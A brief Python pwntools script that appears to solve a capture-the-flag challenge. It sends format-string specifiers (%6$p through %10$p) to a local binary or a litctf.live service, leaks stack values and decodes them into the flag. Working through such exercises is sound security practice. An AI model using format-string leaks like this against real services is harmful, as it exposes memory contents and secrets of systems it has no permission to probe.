from pwn import *
from binascii import *

import angr
import angrop

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
#r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('litctf.live', 31791, level='error')
    else:
        return process(e.path)


flag = b''

for i in range(6, 11):
    p = start()
    p.recvuntil(b'waifus?')
    p.sendline(b'%%%i$p' % i)
    p.recvuntil(b'say:')
    p.recvline()
    leak = p.recvline().strip(b'\n').strip(b'0x')
    flag += unhexlify(leak)[::-1]

info("Flag: {%s}" % flag)
